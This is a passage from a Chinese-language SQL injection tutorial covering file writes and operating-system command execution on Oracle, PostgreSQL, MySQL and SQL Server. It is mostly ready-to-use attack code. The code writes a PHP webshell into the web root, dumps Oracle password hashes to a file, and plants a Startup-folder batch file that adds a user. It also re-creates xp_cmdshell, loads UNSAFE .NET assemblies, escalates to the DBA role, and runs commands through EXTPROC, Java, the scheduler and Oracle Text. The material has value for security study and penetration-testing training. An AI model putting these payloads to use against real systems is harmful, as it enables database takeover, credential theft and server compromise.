exec SYS.DBMS_ADVISOR.CREATE_FILE('</span><span class="token keyword">first</span> <span class="token keyword">row</span><span class="token string">', '</span>EXT<span class="token string">','</span>victim<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>自Oracle 10g以来，可以使用外部表创建一个包含用户名和口令的文件</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> directory EXT <span class="token keyword">as</span> <span class="token string">'C:\';
CREATE TABLE ext_write (
myline)
ORGANIZATION EXTERNAL
(TYPE oracle_datapump
DEFAULT DIRECTORY EXT
LOCATION ('</span>victim3<span class="token punctuation">.</span>txt<span class="token string">'))
PARALLEL
AS
SELECT '</span>I was here<span class="token string">' from dual UNION SELECT name ||'</span><span class="token operator">=</span>'<span class="token operator">||</span>password <span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>DBMS_XSLPROCESSOR可以将XML文件写入文件系统</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> dbms_xslprocessor<span class="token punctuation">.</span>clob2file<span class="token punctuation">(</span>your_xml<span class="token punctuation">,</span><span class="token string">'MYDIR'</span><span class="token punctuation">,</span><span class="token string">'outfile.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>另外还可以通过DBMS_XMLDOM访问文统：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> DIRECTORY XML_DIR <span class="token keyword">AS</span> <span class="token string">'C:\xmlfiles'</span><span class="token punctuation">;</span>
<span class="token keyword">exec</span> DBMS_XMLDOM<span class="token punctuation">.</span>writeToFile<span class="token punctuation">(</span>doc<span class="token punctuation">,</span><span class="token string">'XML_DIR/outfile.xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="PostgreSQL-4"><a href="#PostgreSQL-4" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><p>PostgreSQL不但支持使用COPY功能读取文件，还支持使用COPY功能写入文件，它可以将表中的内容以文本格式写入一个文件中(每一行文本表示表中的一行数据)。文件将按照运行PostgreSQL进程(通常是postgres用户)的用户来创建，因此该用户需要对文件所在的路径具有写入权限。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#假定底层数据库用户具有所要求的“超级用户”权限,创建一个临时表</span>
http:<span class="token comment">//10.10.10.128/test.php?id=1; create table hack(data text);-- </span>
<span class="token comment">#在表中插入PHP Webshell代码</span>
http:<span class="token comment">//10.10.10.128/test.php?id=1; insert into hack(data) values ("&lt;?php passthru($_GET['cmd']);&gt;");-- </span>
<span class="token comment">#将表中的数据复制到一个文件中，将该文件放在Web根目录(Webroot)下</span>
http:<span class="token comment">//10.10.10.128/test.php?id=1; copy(select data from hack) to '/var/www/shell.php';-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一些能够利用的函数</p>
<p>lo_create()、lo_export()和lo_unlink()</p>
<h3 id="执行操作系统命令"><a href="#执行操作系统命令" class="headerlink" title="执行操作系统命令"></a>执行操作系统命令</h3><h4 id="MySQL-2"><a href="#MySQL-2" class="headerlink" title="MySQL"></a>MySQL</h4><p>MySQL服务器和Web服务器位于同一机器上，这样就能使用”select into DUMPFILE”技术在目标机器上构造一个欺骗性的公共网关接口(CGI)</p>
<p>在WAMP(Windows、Apache、MySQL和PHP)环境中，MySQL常常运行在特权用户权限下，因此攻击者可以在系统的任何位置写入文件。可以根据这一特点采用被动代码执行技术(passive code execution),比如在Administrator的启动文件夹中创建一个批处理文 件。当管理员登录到系统后，攻击者的批处理文件将被执行，并且攻击者的代码将在管理员权 限下执行。</p>
<p>下面的例子演示了这种攻击：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//vulnsite/vuln.php?name=test' union select 'net user attacker pwd /add' into outfile 'c:\documents and settings\all users\start menu\programs\startup\owned.bat'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Mssql-2"><a href="#Mssql-2" class="headerlink" title="Mssql"></a>Mssql</h4><p>xp_cmdshell的妙用</p>
<p>现代版本的SQL Server默认禁用了 xp_cmdshell，可以使用sp_configure语句并通过带内信令(signaling)再次打开它。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#通过T-SQL初始化Wscript.Shell实例的方法</span>
<span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> xp_cmdshell3<span class="token punctuation">(</span><span class="token variable">@cmd</span> <span class="token keyword">varchar</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> @ wait <span class="token keyword">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">AS</span><span class="token comment">-- </span>
<span class="token keyword">Create</span> wscript<span class="token punctuation">.</span>Shell object 
<span class="token keyword">DECLARE</span> <span class="token variable">@result</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token variable">@OLEResult</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token variable">@RunResult</span> <span class="token keyword">int</span> <span class="token keyword">DECLARE</span> <span class="token variable">@ShellID</span> <span class="token keyword">int</span> 
<span class="token keyword">EXECUTE</span> <span class="token variable">@OLEResult</span> <span class="token operator">=</span> sp_OACreate <span class="token string">'WScript.Shell'</span><span class="token punctuation">,</span> <span class="token variable">@shellID</span> <span class="token keyword">OUT</span> 
<span class="token keyword">IF</span> <span class="token variable">@OLEResult</span> <span class="token operator">&lt;&gt;</span> <span class="token number">0</span> <span class="token keyword">SELECT</span> <span class="token variable">@result</span> <span class="token operator">=</span> <span class="token variable">@OLEResult</span> 
<span class="token keyword">IF</span> <span class="token variable">@OLEResult</span> <span class="token operator">&lt;&gt;</span> <span class="token number">0</span> <span class="token keyword">RAISERROR</span><span class="token punctuation">(</span><span class="token string">'CreateObject0X'</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">@OLEResult</span><span class="token punctuation">)</span>
<span class="token keyword">EXECUTE</span> <span class="token variable">@OLEResult</span> <span class="token operator">=</span> sp_OAMethod <span class="token variable">@ShellID</span><span class="token punctuation">,</span> <span class="token string">'Run'</span><span class="token punctuation">,</span> <span class="token boolean">Null</span><span class="token punctuation">,</span> <span class="token variable">@cmd</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">@wait</span> 
<span class="token keyword">IF</span> <span class="token variable">@OLEResult</span> <span class="token operator">&lt;&gt;</span> <span class="token number">0</span> <span class="token keyword">SELECT</span> <span class="token variable">@result</span> <span class="token operator">=</span> <span class="token variable">@OLEResult</span> 
<span class="token keyword">IF</span> <span class="token variable">@OLEResult</span> <span class="token operator">&lt;&gt;</span> <span class="token number">0</span> <span class="token keyword">RAISERROR</span><span class="token punctuation">(</span><span class="token string">'Run8OX'</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">@OLEResult</span><span class="token punctuation">)</span>
<span class="token comment">--If @OLEResult &lt;&gt; 0 EXEC sp_displayoaerrorinfo @shellID, @OLEResult </span>
<span class="token keyword">EXECUTE</span> QOLEResult <span class="token operator">=</span> sp_OADestroy <span class="token variable">@ShellID</span> 
<span class="token keyword">return</span> <span class="token variable">@result</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用CREATE ASSEMBLY指令促使SQL Server从系统中加载文件。如果想使用该功能加载一个有效的.NET二进制文件，有三种选择：</p>
<ul>
<li><p>创建并加载本地可执行文件：</p>
<p>在系统中创建源文件； 将源文件编译为可执行文件； 从 C:\temp\foo.dll 调用 CREATE ASSEMBLY FOO。</p>
</li>
<li><p>从UNC共享加载可执行文件：</p>
<p>在公共访问的Windows共享中创建DLL(或EXE)； 从\public_server\temp\fbo.dll 调用 CREATE ASSEMBLYFOO。</p>
</li>
<li><p>从传递的字符串创建可执行文件：</p>
<ol>
<li><p>创建可执行文件。</p>
</li>
<li><p>将可执行文件分解成HEX：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">File</span><span class="token punctuation">.</span><span class="token keyword">open</span><span class="token punctuation">(</span><span class="token string">"moo.dll"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"H*"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>"<span class="token number">4</span>d5a90000300000004000000ffff0<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>从 4d5a90000300000004000000ffff0 调用CREATE ASSEMBLY MOO</p>
</li>
</ol>
</li>
</ul>
<p>NET提供的信任级别</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SAFE：
＞执行计算
＞禁止访问外部资源
EXTERNAL_ACCESS:
＞访问硬盘
＞访问环境
＞带某些限制的几乎完全的访问
UNSAFE：
＞等价于完全信任
＞调用非托管代码
＞以SYSTEM身份做任何事情<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们的目标是以UNSAFE级别加载二进制文件。将数据库设置为“Trustworthy”可以绕开这种限制。</p>
<p>不受限制地创建一个.NET二进制文件，然后使用设置为UNSAFE的许可将其导入到系统中</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">database</span> master <span class="token keyword">set</span> Trustworthy <span class="token keyword">on</span> <span class="token keyword">CREATE</span> ASSEMELY shoe <span class="token keyword">FROM</span> Ox4d5a90<span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">WITH</span> PERMISSION_SET<span class="token operator">=</span>unsafe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Oracle-7"><a href="#Oracle-7" class="headerlink" title="Oracle"></a>Oracle</h4><p>代码的执行通常要求数据库用户具有DBA权限</p>
<h5 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h5><p>特定的PL/SQL块(比如函数、存储过程、触发器、 视图等)都是在特定的权限之下才能执行</p>
<p>Oracle带有许多默认的安装包，这些包中包含了大量的对象(表、视 图、函数、过程等等)，SYS具有最高级别的访问权限，在SYS权限下执行SQL语句就能赋予自己DAB角色。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#以一个非特权用户test连接到数据库</span>

<span class="token comment">#创建一个函数并注入易受攻击的过程</span>
<span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> X <span class="token keyword">return</span> varchar2
authid <span class="token keyword">current_user</span> <span class="token keyword">as</span> 
pragna autononous_transaction<span class="token punctuation">;</span> 
<span class="token keyword">BEGIN</span> 
<span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token string">'GRANT DBA TO SCOTT'</span><span class="token punctuation">;</span> 
<span class="token keyword">COMMIT</span><span class="token punctuation">;</span> 
<span class="token keyword">RETURN</span> 
<span class="token keyword">END</span><span class="token punctuation">;</span>
<span class="token keyword">exec</span> SYS<span class="token punctuation">.</span>LT<span class="token punctuation">.</span>CREATEVORKSPACE<span class="token punctuation">(</span><span class="token string">'zz'' and scott.x&lt;&gt;=''x'</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
<span class="token keyword">exec</span> SYS<span class="token punctuation">.</span>LT<span class="token punctuation">.</span>RENOUEWORKSPACE<span class="token punctuation">(</span><span class="token string">'zz'' and scott.x&lt;&gt;=''x'</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>

<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_role_privs<span class="token punctuation">;</span>
<span class="token comment">#可以看到SCOTT具有DBA角色</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#具有 CREATE ANY PROCEDURE 和 EXECUTE ANY PROCEDURE 权限的用户可以在SYSTEM模式下创建一个存储过程：</span>
<span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">procedure</span> SYSTEM<span class="token punctuation">.</span>DBATEST
<span class="token operator">IS</span>
<span class="token keyword">BEGIN</span>
<span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token string">'GRANT DBA TO SCOTT'</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
<span class="token operator">/</span>

<span class="token keyword">EXEC</span> SYSTEM<span class="token punctuation">.</span>DBATEST<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="通过直接访问执行代码"><a href="#通过直接访问执行代码" class="headerlink" title="通过直接访问执行代码"></a>通过直接访问执行代码</h5><p>如果可以直接访问Oracle实例，那么根据Oracle版本的不同，可以使用下列多种不同的方法。</p>
<p><code>Oracle EXTPROC</code>、<code>Java</code>、<code>DBMS_SCHEDULER</code>是Oracle运行操作系统命令的正式方法。</p>
<p>使用Oracle数据库中的其他功能来执行操作系统代码，包括<code>PL/SQL native</code>、<code>Oracle Text</code> 、<code>Alter System set 事件</code>、<code>PL/SQL native 9i</code>、<code>Buffer overflow（缓冲区溢出）+ shell代码</code>、<code>Custom code（自定义代码）</code></p>
<ul>
<li><p><code>Oracle EXTPROC</code>和<code>Java</code></p>
<p><a target="_blank" rel="noopener" href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql</a></p>
</li>
<li><p><code>Oracle EXTPROC</code></p>
<p>Oracle数据库的PL/SQL程序设计语言可以通过EXTPROC执行外部过程</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#恶意用户首先创建一个共享对象(shared object)—通常是DLL文件或系统库，其中包含了允许执行OS代码的功能：</span>
<span class="token comment">-- 对于Windows系统</span>
<span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> LIBRARY exec_shell <span class="token keyword">AS</span> <span class="token string">'C:\windows\system32\msvcrt.dll'</span><span class="token punctuation">;</span>
<span class="token comment">-- 对于UNIX系统</span>
<span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> LIBRARY exec_shell <span class="token keyword">AS</span> <span class="token string">'/lib/libc-2.2.5.so'</span><span class="token punctuation">;</span>

<span class="token comment">#创建一个过程，调用该库的系统函数：</span>
<span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">procedure</span> oraexec<span class="token punctuation">(</span>cmdstring <span class="token operator">IN</span> <span class="token keyword">CHAR</span><span class="token punctuation">)</span> <span class="token operator">is</span> external NAME <span class="token string">"system"</span>
library exec_shell
<span class="token keyword">LANGUAGE</span> C<span class="token punctuation">;</span>

<span class="token comment">#执行该过程：</span>
<span class="token keyword">exec</span> oraexec<span class="token punctuation">(</span><span class="token string">'net user hacker hack3r /ADD'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#当执行oraexec过程时，数据库指示EXTPROC加载msvcrt.dll或libc库，并执行system()函数。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>通过Java库执行操作系统命令</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#查看用户Java(文件和执行)的许可权限：</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_java_policy <span class="token keyword">where</span> grantee_name <span class="token operator">=</span> <span class="token string">'SCOTT'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>数据库用户具有正确的Java IO许可权限，执行OS代码的方法</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#DBMS_JAVA.RUNJAVA(受影响的系统：11g R1、11g R2)：</span>
http:<span class="token comment">//192.168.2.10/ora8.php?name=SCOTT' and (SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c dir&gt;C:\\OUT.LST') FROM DUAL) is not null -- </span>

<span class="token string">'
#DBMS_JAVA_TEST.FUNCALL(受影响的系统：9iR2、10g R2、11g R1、11g R2)：
http://192.168.2.10/ora8.php?name=SCOTT'</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">Select</span> DBMS_JAVA_TEST<span class="token punctuation">.</span>FUNCALL<span class="token punctuation">(</span><span class="token string">'oracle/aurora/util/Wrapper '</span><span class="token punctuation">,</span><span class="token string">'main'</span><span class="token punctuation">,</span><span class="token string">'c:\\windows\\system32\\cmd.exe'</span><span class="token punctuation">,</span><span class="token string">'/c'</span><span class="token punctuation">,</span><span class="token string">'dir&gt;c:\\OUT2.LST'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">)</span> <span class="token operator">is</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># DBMS_JVM_EXP_PERMS允许具有CREATE SESSION权限的用户授予自己Java IO许可权限：</span>
<span class="token keyword">DECLARE</span> POL DBMS_JVM_EXP_PERMS<span class="token punctuation">.</span>TEMP_JAVA_POLICY<span class="token punctuation">;</span> <span class="token keyword">CURSOR</span> Cl <span class="token operator">IS</span> <span class="token keyword">SELECT</span> <span class="token string">''</span><span class="token keyword">GRANT</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">''</span>SYS<span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FilePermission<span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token operator">&lt;&lt;</span><span class="token keyword">ALL</span> FI LES<span class="token operator">&gt;&gt;</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token keyword">execute</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span>ENABLED<span class="token string">''</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span> <span class="token keyword">BEGIN</span> <span class="token keyword">OPEN</span> Cl<span class="token punctuation">;</span> <span class="token keyword">FETCH</span> Cl <span class="token keyword">BULK</span> COLLECT <span class="token keyword">INTO</span> POL<span class="token punctuation">;</span>CLOSECI<span class="token punctuation">;</span>DBMS_JVM_EXP_PERMS<span class="token punctuation">.</span>IMPORT_JVM_PERMS<span class="token punctuation">(</span>POL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li><p><code>DBMS_SCHEDULER</code></p>
<p>DBMS_SCHEDULER是Oracle 10g及之后版本中新增的内容，它要求拥有CREATE JOB (10gR1)或 CREATE EXTERNAL JOB(10gR2/11g)权限。自 10.2.0.2 起，不能再以 oracle 用户身 份执行操作系统命令，而要以nobody用户执行：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--Create a Program for dbms_scheduler</span>
<span class="token keyword">exec</span> DBMS_SCHEDULER<span class="token punctuation">.</span>create_program<span class="token punctuation">(</span><span class="token string">'RDS2009'</span><span class="token punctuation">,</span><span class="token string">'EXECUTABLE'</span><span class="token punctuation">,</span><span class="token string">'c:\WINDOWS\system32\cmd.exe /c echo Owned &gt;&gt; c:\rds3.txt'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">--Create, execute, and delete a Job for dbms_scheduler</span>
<span class="token keyword">exec</span> DBMS_SCHEDULER<span class="token punctuation">.</span>create_job<span class="token punctuation">(</span>job_name <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">'RDS2009JOB'</span><span class="token punctuation">,</span>program_name <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">'RDS2009'</span><span class="token punctuation">,</span>start_date <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>repeat_interval <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>end_date <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>enabled <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">TRUE</span><span class="token punctuation">,</span>auto_drop <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p><code>PL/SQL native</code></p>
<p>拥有修改数据库服务器上SPNC_COMMANDS文本文件的权限。如果创建了存储过程、函数或包并启用了 PL/SQL native,那么Oracle会执行该文件中的所有内容。</p>
<p>下列代码使用PL/SQL native为public授予DBA权限。grant命令是一条通常以SYS用户身份执行的INSERT INTO SYSAUTHS$命令。</p>
<p>本例中，我们创建了一个名为e2.sql且由sqlplus 执行的文本文件，sqlplus命令可通过PL/SQL native来启动：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> Fl <span class="token keyword">return</span> number
authid <span class="token keyword">current_user</span> <span class="token keyword">as</span>
pragma autonomous_transaction<span class="token punctuation">;</span>
v_file UTL_FILE<span class="token punctuation">.</span>FILE_TYPE<span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span>
<span class="token keyword">EXECUTE</span> IMMEDIATE q<span class="token string">'!create directory TX as '</span>C:\'<span class="token operator">!</span><span class="token string">';
begin
-- grant dba to public;
DBMS_ADVISOR.CREATE_FILE ('</span><span class="token keyword">insert</span> <span class="token keyword">into</span> sys<span class="token punctuation">.</span>sysauth$ <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token string">'||chr(13)||chr(10)||'</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token string">','</span>TX<span class="token string">','</span>e2<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token string">');
end;
EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">drop</span> directory TX<span class="token operator">!</span><span class="token string">';
EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">create</span> directory T <span class="token keyword">as</span> <span class="token string">'C:\ORACLE\ORA101\PLSQL'</span><span class="token operator">!</span><span class="token string">'; 
utl_file.fremove('</span>T<span class="token string">','</span>spnc_commands<span class="token string">');
v_file: = utl_file.fopen ('</span>T<span class="token string">','</span>spnc_commancis<span class="token string">','</span>w<span class="token string">');
utl_file.put_line(v_file,'</span>sqlplus <span class="token operator">/</span> <span class="token keyword">as</span> sysdba <span class="token variable">@c</span>:\e2<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token string">'); 
utl_file.fclose(v_file);
EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">drop</span> directory T<span class="token operator">!</span><span class="token string">';
EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">alter</span> <span class="token keyword">session</span> <span class="token keyword">set</span> plsql_compiler_flags<span class="token operator">=</span><span class="token string">'NATIVE'</span><span class="token operator">!</span><span class="token string">'; 
EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">alter</span> system <span class="token keyword">set</span> plsql_native_library_dir<span class="token operator">=</span><span class="token string">'C:\'!'</span><span class="token punctuation">;</span> 
<span class="token keyword">EXECUTE</span> IMMEDIATE q<span class="token string">'!create or replace procedure hl as begin null; 
end;!'</span><span class="token punctuation">;</span>
<span class="token keyword">COMMIT</span><span class="token punctuation">;</span>
<span class="token keyword">RETURN</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p><code>Oracle Text</code></p>
<p>Oracle Text也可以执行操作系统命令。通过用户自定义的过滤器(USER_FILTER_PREF), 可以将表的内容传递给用户自定义的过滤器。在下面的例子中，通过一个表将TCL代码传递 给用户自定义的过滤器。</p>
<p>使用Oracle Text用户自定义的过滤器存在着一个限制。只能从ORACLE_HOME/bin目录执行。例如，oratclsh.exe就可以执行。对于这一限制，可以使用UTL_FILE包将相应的可执行文件复制到ORACLE_HOME/bin目录，以便执行该文件：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> t <span class="token punctuation">(</span>id number<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">,</span> <span class="token keyword">text</span> varchar2<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">Begin</span>
ctxsys<span class="token punctuation">.</span>ctx_ddl<span class="token punctuation">.</span>drop_preference<span class="token punctuation">(</span><span class="token string">'USER_FILTER_PREF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">end</span><span class="token punctuation">;</span>
<span class="token operator">/</span>
<span class="token keyword">begin</span>
ctxsys<span class="token punctuation">.</span>ctx_ddl<span class="token punctuation">.</span>create_preference
<span class="token punctuation">(</span>
preference_name <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'USER_FILTER_PREF'</span><span class="token punctuation">,</span>
object_name <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'USER_FILTER'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
ctxsys<span class="token punctuation">.</span>ctx_ddl<span class="token punctuation">.</span>set_attribute
<span class="token punctuation">(</span><span class="token string">'USER_FILTER_PREF'</span><span class="token punctuation">,</span><span class="token string">'COMMAND'</span><span class="token punctuation">,</span><span class="token string">'oratclsh.exe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">end</span><span class="token punctuation">;</span>
<span class="token operator">/</span>
<span class="token keyword">begin</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> t <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'
set f [open "C:/AHT.txt" {RDWR CREAT}]
puts $f "Your System is not protected!"
close $f
set f [open [lindex $argv 0] {RDWR CREAT}]
puts $f "SUCCESSH"
close $f
'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">end</span><span class="token punctuation">;</span>
<span class="token operator">/</span>
<span class="token keyword">drop</span> <span class="token keyword">index</span> user_filter_idx<span class="token punctuation">;</span>
<span class="token keyword">create</span> <span class="token keyword">index</span> user_filter_idx <span class="token keyword">on</span> t <span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span>
indextype <span class="token operator">is</span> ctxsys<span class="token punctuation">.</span>context
parameters <span class="token punctuation">(</span><span class="token string">'FILTER USER_FILTER_PREF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
